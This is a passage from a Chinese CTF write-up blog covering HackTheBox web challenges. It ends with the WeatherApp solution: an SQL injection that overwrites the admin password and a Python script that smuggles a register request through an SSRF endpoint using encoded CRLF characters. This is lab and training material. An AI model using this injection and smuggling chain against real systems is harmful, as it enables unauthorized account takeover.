username=admin')&amp;password=1') ON CONFLICT(username) DO UPDATE SET password = 'admin';--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>写 exp 脚本，此处借用其他人的 exp</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://167.172.52.221:30483"</span>

username<span class="token operator">=</span><span class="token string">"admin"</span>

password<span class="token operator">=</span><span class="token string">"123') ON CONFLICT(username) DO UPDATE SET password = 'admin';--"</span>
parsedUsername <span class="token operator">=</span> username<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token string">"\u0120"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"'"</span><span class="token punctuation">,</span> <span class="token string">"%27"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">"%22"</span><span class="token punctuation">)</span>
parsedPassword <span class="token operator">=</span> password<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token string">"\u0120"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"'"</span><span class="token punctuation">,</span> <span class="token string">"%27"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">"%22"</span><span class="token punctuation">)</span>
contentLength <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>parsedUsername<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">len</span><span class="token punctuation">(</span>parsedPassword<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">19</span>
endpoint <span class="token operator">=</span> <span class="token string">'127.0.0.1/\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010A\u010D\u010APOST\u0120/register\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010AContent-Type:\u0120application/x-www-form-urlencoded\u010D\u010AContent-Length:\u0120'</span> <span class="token operator">+</span> <span class="token builtin">str</span> <span class="token punctuation">(</span>contentLength<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\u010D\u010A\u010D\u010Ausername='</span><span class="token operator">+</span>parsedUsername <span class="token operator">+</span> <span class="token string">'&amp;password='</span><span class="token operator">+</span> parsedPassword <span class="token operator">+</span> <span class="token string">'\u010D\u010A\u010D\u010AGET\u0120/?lol='</span>

city<span class="token operator">=</span><span class="token string">'test'</span>

country<span class="token operator">=</span><span class="token string">'test'</span>

json<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'endpoint'</span><span class="token punctuation">:</span>endpoint<span class="token punctuation">,</span><span class="token string">'city'</span><span class="token punctuation">:</span>city<span class="token punctuation">,</span><span class="token string">'country'</span><span class="token punctuation">:</span>country<span class="token punctuation">&#125;</span>

res<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token operator">+</span><span class="token string">'/api/weather'</span><span class="token punctuation">,</span>json<span class="token operator">=</span>json<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p>执行 exp 成功之后再返回到登录界面，使用 admin，admin 登录即可。</p>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/WeatherAppsucc.png" class="">
<h3 id="0x04-小结-1"><a href="#0x04-小结-1" class="headerlink" title="0x04 小结"></a>0x04 小结</h3><p>这道题目难度中等，如果不提供源码的话是非常难以解决的，虽然可以想到 SSRF，但有点盲人摸象的感觉。</p>
<p>加上 nodejs 的数据包传输问题，构造 exp 较为麻烦。建议初学者不一定要读懂 exp，只是简单了解做题的思路即可。</p>

            </div>

            
                <div class="post-copyright-info">
                    
<div class="article-copyright-info-container">
    <ul class="copyright-info-content">
        <li class="post-title">
            <span class="type">本文标题</span>：<span class="content">HackTheBox之Web部分刷题记录</span>
        </li>
        <li class="post-author">
            <span class="type">本文作者</span>：<span class="content">Drunkbaby</span>
        </li>
        <li class="post-time">
            <span class="type">创建时间</span>：<span class="content">2022-07-20 17:42:20</span>
        </li>
        <li class="post-link">
            <span class="type">本文链接</span>：<span class="content">2022/07/20/HackTheBox之Web部分刷题记录/</span>
        </li>
        <li class="post-license">
            <span class="type">版权声明</span>：<span class="content">本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！</span>
        </li>
    </ul>
    <div class="copy-copyright-info flex-center tooltip" data-content="复制版权信息" data-offset-y="-2px">
        <i class="fa-solid fa-copy"></i>
    </div>
</div>

                </div>
            

            
                <ul class="post-tags-box">
                    
                        <li class="tag-item">
                            <a href="/tags/CTF%E5%88%B7%E9%A2%98/">#CTF刷题</a>&nbsp;
                        </li>
                    
                </ul>
            

            
                <div class="article-nav">
                    
                        <div class="article-prev">
                            <a class="prev"
                               rel="prev"
                               href="/2022/07/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9802-RMI%E7%9A%84%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/"
                            >
                            <span class="left arrow-icon flex-center">
                              <i class="fas fa-chevron-left"></i>
                            </span>
                                <span class="title flex-center">
                                <span class="post-nav-title-item">Java反序列化之RMI专题02-RMI的几种攻击方式</span>
                                <span class="post-nav-item">上一篇</span>
                            </span>
                            </a>
                        </div>
                    
                    
                        <div class="article-next">
                            <a class="next"
                               rel="next"
                               href="/2022/07/20/Buu%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"
                            >
                            <span class="title flex-center">
                                <span class="post-nav-title-item">Buu之Web部分刷题记录</span>
                                <span class="post-nav-item">下一篇</span>
                            </span>
                                <span class="right arrow-icon flex-center">
                              <i class="fas fa-chevron-right"></i>
                            </span>
                            </a>
                        </div>
                    
                </div>
            

            
                <div class="comment-container">
                    
<div class="comments-container">
    <div id="comments-anchor"></div>
    <div class="comment-area-title">
        <i class="fas fa-comments"></i>&nbsp;评论
    </div>
    
        
            

    <div class="valine-container">
        <script data-pjax src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
        <div id="vcomments"></div>
        <script data-pjax>
          function loadValine() {

            const config = {
              el: '#vcomments',
              appId: 'mCIu9X4iLP3I0GikUoetB9bV-9Nh9j0Va',
              appKey: 'ermlV1eoB1YODT088EdXjo6C',
              meta: ['nick', 'mail', 'link'],
              avatar: 'wavatar',
              enableQQ: true,
              placeholder: 'just go go',
              lang: 'zh-CN'.toLowerCase()
            }

            if ('') {
              config.serverURLs = ''
            }

            new Valine(config)

            function getAuthor(language) {
              switch (language) {
                case 'en':
                  return 'Author'
                case 'zh-CN':
                  return '博主'
                default:
                  return 'Master'
              }
            }

            // Add "Author" identify
            const getValineDomTimer = setInterval(() => {
              const vcards = document.querySelectorAll('#vcomments .vcards .vcard')
              if (vcards.length > 0) {
                let author = 'Drunkbaby'

                if (author) {
                  for (let vcard of vcards) {
                    const vnick_dom = vcard.querySelector('.vhead .vnick')
                    const vnick = vnick_dom.innerHTML
                    if (vnick === author) {
                      vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
                    }
                  }
                }
                clearInterval(getValineDomTimer)
              } else {
                clearInterval(getValineDomTimer)
              }
            }, 2000)
          }

          if ('true' === 'true') {
            const loadValineTimeout = setTimeout(() => {
              loadValine()
              clearTimeout(loadValineTimeout)
            }, 1000)
          } else {
            window.addEventListener('DOMContentLoaded', loadValine)
          }
        </script>
    </div>



        
    
</div>

                </div>
            
        </div>

        
            <div class="toc-content-container">
                <div class="post-toc-wrap">
    <div class="post-toc">
        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Let%E2%80%99s-GO"><span class="nav-text">Let’s GO!</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#HackTheBox-AbuseHumanDB"><span class="nav-text">HackTheBox-AbuseHumanDB</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-%E5%88%9D%E8%AF%86%E9%9D%B6%E5%9C%BA"><span class="nav-text">0x01 初识靶场</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="nav-text">0x02 代码审计</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HackTheBox-baby-CachedView"><span class="nav-text">HackTheBox-baby-CachedView</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="nav-text">0x01 前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-%E5%88%9D%E8%AF%86%E9%9D%B6%E5%9C%BA"><span class="nav-text">0x02 初识靶场</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%EF%BC%8C%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="nav-text">0x03 源码阅读，代码审计</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-%E8%A7%A3%E9%A2%98"><span class="nav-text">0x04 解题</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HackTheBox-Diogenes%E2%80%99-Rage"><span class="nav-text">HackTheBox-Diogenes’ Rage</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-%E5%89%8D%E8%A8%80-1"><span class="nav-text">0x01 前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-%E5%88%9D%E8%AF%86%E9%9D%B6%E5%9C%BA-1"><span class="nav-text">0x02 初识靶场</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="nav-text">0x03 代码审计</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E4%B8%80%E3%80%81%E4%BF%AE%E6%94%B9-apply-%E8%BF%9B%E5%8E%BB%E7%9A%84%E6%95%B0%EF%BC%8C%E4%BD%BF%E5%BE%97%E9%92%B1%E5%A4%9F%E4%BB%98"><span class="nav-text">思路一、修改 apply 进去的数，使得钱够付</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E4%BA%8C%E3%80%81%E4%BF%AE%E6%94%B9%E8%B4%A7%E7%89%A9%E7%9A%84%E4%BB%B7%E6%A0%BC"><span class="nav-text">思路二、修改货物的价格</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-%E6%9E%84%E9%80%A0%E5%BC%82%E6%AD%A5%E5%8F%91%E5%8C%85%E7%9A%84-exp"><span class="nav-text">0x04 构造异步发包的 exp</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%99-exp"><span class="nav-text">写 exp</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HackTheBox-Easter-Bunny"><span class="nav-text">HackTheBox-Easter-Bunny</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-%E5%89%8D%E8%A8%80-2"><span class="nav-text">0x01 前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-%E5%88%9D%E8%AF%86%E9%9D%B6%E5%9C%BA-2"><span class="nav-text">0x02 初识靶场</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-1"><span class="nav-text">0x03 代码审计</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HackTheBox-interdimensional-internet"><span class="nav-text">HackTheBox-interdimensional internet</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-%E5%89%8D%E8%A8%80-3"><span class="nav-text">0x01 前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-%E5%88%9D%E8%AF%86%E9%9D%B6%E5%9C%BA-3"><span class="nav-text">0x02 初识靶场</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-2"><span class="nav-text">0x03 代码审计</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-%E6%9E%84%E9%80%A0-payload"><span class="nav-text">0x04 构造 payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05-%E6%80%BB%E7%BB%93"><span class="nav-text">0x05 总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HackTheBox-LoveTok"><span class="nav-text">HackTheBox-LoveTok</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90%E9%9D%B6%E5%9C%BA"><span class="nav-text">0x01 简单分析靶场</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-1"><span class="nav-text">0x02 代码审计</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8D%95%E5%88%80%E7%9B%B4%E5%85%A5%EF%BC%8C%E5%AF%BB%E6%89%BE-flag"><span class="nav-text">单刀直入，寻找 flag</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%AA%E5%AF%BB%E6%89%BE%E5%88%B0-flag%EF%BC%8C%E9%9C%80%E8%A6%81%E9%9D%99%E4%B8%8B%E5%BF%83%E6%9D%A5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="nav-text">未寻找到 flag，需要静下心来代码审计</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%8F%AF%E6%8E%A7%E5%88%B6%E5%8F%98%E9%87%8F-format"><span class="nav-text">利用可控制变量 format</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-%E5%B0%8F%E7%BB%93"><span class="nav-text">0x03 小结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HackTheBox-Neonify"><span class="nav-text">HackTheBox-Neonify</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-%E5%89%8D%E8%A8%80-4"><span class="nav-text">0x01 前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-%E5%88%9D%E8%AF%86%E9%9D%B6%E5%9C%BA-4"><span class="nav-text">0x02 初识靶场</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3"><span class="nav-text">0x03 代码审计</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-%E6%9E%84%E9%80%A0-EXP"><span class="nav-text">0x04 构造 EXP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05-%E5%B0%8F%E7%BB%93"><span class="nav-text">0x05 小结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HackTheBox-petpet-rcbee"><span class="nav-text">HackTheBox-petpet-rcbee</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-%E5%89%8D%E8%A8%80-5"><span class="nav-text">0x01 前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><span class="nav-text">0x02 漏洞挖掘</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90%EF%BC%8C%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="nav-text">0x03 源码剖析，代码审计</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%8C%E9%80%90%E8%A1%8C%E5%88%86%E6%9E%90"><span class="nav-text">代码审计，逐行分析</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#exp-%E7%9A%84%E7%BC%96%E5%86%99"><span class="nav-text">exp 的编写</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-%E5%9B%9E%E5%A4%B4%E7%9C%8B-exp%EF%BC%8C%E6%8E%A2%E7%A9%B6%E4%B8%80%E4%B8%8B%E5%8E%9F%E7%90%86"><span class="nav-text">0x04 回头看 exp，探究一下原理</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HackTheBox-Phonebook"><span class="nav-text">HackTheBox-Phonebook</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-%E9%9D%B6%E5%9C%BA%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90"><span class="nav-text">0x01 靶场简单分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-%E5%81%9A%E9%A2%98%E5%8E%86%E7%A8%8B"><span class="nav-text">0x02 做题历程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-%E7%BC%96%E5%86%99-exp"><span class="nav-text">0x03 编写 exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HackTheBox-Templated"><span class="nav-text">HackTheBox-Templated</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-%E9%9D%B6%E5%9C%BA%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90-1"><span class="nav-text">0x01 靶场简单分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-payload"><span class="nav-text">0x02 payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="nav-text">0x03 利用方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-%E6%80%BB%E7%BB%93"><span class="nav-text">0x04 总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HackTheBox-Toxic"><span class="nav-text">HackTheBox Toxic</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-%E4%B8%80%E4%BA%9B%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-text">0x01 一些前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-PHP%E5%BA%8F%E5%88%97%E5%8C%96%E6%98%AF%E4%BB%80%E4%B9%88"><span class="nav-text">1. PHP序列化是什么</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%B8%A4%E4%B8%AA%E5%87%BD%E6%95%B0"><span class="nav-text">两个函数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BD%93%E9%AA%8C%E4%B8%80%E4%B8%8B%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">体验一下序列化和反序列化</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-php-%E7%9A%84%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="nav-text">2. php 的魔术方法</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-destruct-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8"><span class="nav-text">0x02 __destruct() 魔术方法的反序列化利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-%E5%9B%9E%E5%88%B0%E9%A2%98%E7%9B%AE%EF%BC%8C%E5%88%86%E6%9E%90%E9%A2%98%E7%9B%AE"><span class="nav-text">0x03 回到题目，分析题目</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BA%90%E7%A0%81%E9%83%A8%E5%88%86"><span class="nav-text">源码部分</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E9%83%A8%E5%88%86"><span class="nav-text">题目部分</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-%E5%88%A9%E7%94%A8-cookie"><span class="nav-text">(1). 利用 cookie</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-%E8%AF%BB%E5%8F%96-nginx-%E7%94%A8%E6%88%B7%E7%9A%84%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6"><span class="nav-text">(2). 读取 nginx 用户的日志文件</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-%E5%88%A9%E7%94%A8-User-Agent-%E8%BF%9B%E8%A1%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-text">(3). 利用 User-Agent 进行命令执行</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-%E5%B0%8F%E7%BB%93"><span class="nav-text">0x04 小结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HackTheBox-Under-Construction"><span class="nav-text">HackTheBox-Under-Construction</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-%E5%89%8D%E8%A8%80-6"><span class="nav-text">0x01 前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-%E5%88%9D%E8%AF%86%E9%9D%B6%E5%9C%BA-5"><span class="nav-text">0x02 初识靶场</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-4"><span class="nav-text">0x03 代码审计</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-Exploit-of-it"><span class="nav-text">0x04 Exploit of it</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HackTheBox-WeatherApp"><span class="nav-text">HackTheBox-WeatherApp</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-%E9%9D%B6%E5%9C%BA%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90-2"><span class="nav-text">0x01 靶场简单分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-%E5%BC%80%E6%89%93"><span class="nav-text">0x02 开打</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%99%BB%E5%BD%95%E7%95%8C%E9%9D%A2%E5%B0%9D%E8%AF%95"><span class="nav-text">登录界面尝试</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B3%A8%E5%86%8C%E7%95%8C%E9%9D%A2%E5%B0%9D%E8%AF%95"><span class="nav-text">注册界面尝试</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-5"><span class="nav-text">0x03 代码审计</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%AE%A1%E8%AE%A1%E8%8E%B7%E5%8F%96-flag-%E7%9A%84%E6%9D%A1%E4%BB%B6"><span class="nav-text">1. 审计获取 flag 的条件</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A6%82%E6%9E%9C%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8D%E5%AD%98%E5%9C%A8-admin-%E7%94%A8%E6%88%B7"><span class="nav-text">如果数据库不存在 admin 用户</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A6%82%E6%9E%9C%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%9C%A8-admin-%E7%94%A8%E6%88%B7"><span class="nav-text">如果数据库存在 admin 用户</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%AE%A1%E8%AE%A1%E6%9F%A5%E6%89%BE-admin"><span class="nav-text">2. 审计查找 admin</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E5%AF%BB%E6%89%BE%E5%8F%AF%E6%94%BB%E5%87%BB%E7%9A%84-SSRF-%E7%82%B9"><span class="nav-text">3. 寻找可攻击的 SSRF 点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-%E5%B0%8F%E7%BB%93-1"><span class="nav-text">0x04 小结</span></a></li></ol></li></ol></li></ol>
    </div>
</div>

            </div>
        
    </div>
</div>


                
            </div>

        </div>

        <div class="page-main-content-bottom">
            
<footer class="footer">
    <div class="info-container">
        <div class="copyright-info info-item">
            &copy;
            
                <span>2021</span> -
            
            2023
            
                &nbsp;<i class="fas fa-heart icon-animate"></i>
                &nbsp;<a href="/">Drunkbaby</a>
            
        </div>
        
            <script async data-pjax
                    src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="website-count info-item">
                
                    访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
                
                
                    总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
                
            </div>
        
        <div class="theme-info info-item">
            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.6.1</a>
        </div>
        
        
    </div>
</footer>

        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="tools-list">
        <!-- TOC aside toggle -->
        
            <li class="tools-item flex-center toggle-show-toc">
                <i class="fas fa-list"></i>
            </li>
        

        <!-- go comment -->
        
            <li class="tools-item flex-center go-to-comments">
                <i class="fas fa-comment"></i>
                <span class="post-comments-count"></span>
            </li>
        
    </ul>
</div>

        </div>
    

    <div class="right-bottom-side-tools">
        <div class="side-tools-container">
    <ul class="side-tools-list">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <li class="tools-item tool-dark-light-toggle flex-center">
            <i class="fas fa-moon"></i>
        </li>

        <!-- rss -->
        

        
            <li class="tools-item tool-scroll-to-top flex-center">
                <i class="fas fa-arrow-up"></i>
            </li>
        

        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list">
        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>
        
    </ul>
</div>

    </div>

    <div class="zoom-in-image-mask">
    <img class="zoom-in-image">
</div>


    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fas fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="搜索..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="close-popup-btn">
                <i class="fas fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    

</main>



<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/dark-light-toggle.js"></script>




    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/local-search.js"></script>



    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/code-block.js"></script>




<div class="post-scripts pjax">
    
        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/post-helper.js"></script>
        
            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/anime.min.js"></script>
        
        
            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/toc.js"></script>
        
    
</div>


    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/pjax.min.js"></script>
<script>
    window.addEventListener('DOMContentLoaded', () => {
        window.pjax = new Pjax({
            selectors: [
                'head title',
                '.page-container',
                '.pjax'
            ],
            history: true,
            debug: false,
            cacheBust: false,
            timeout: 0,
            analytics: false,
            currentUrlFullReload: false,
            scrollRestoration: false,
            // scrollTo: true,
        });

        document.addEventListener('pjax:send', () => {
            KEEP.utils.pjaxProgressBarStart();
        });

        document.addEventListener('pjax:complete', () => {
            KEEP.utils.pjaxProgressBarEnd();
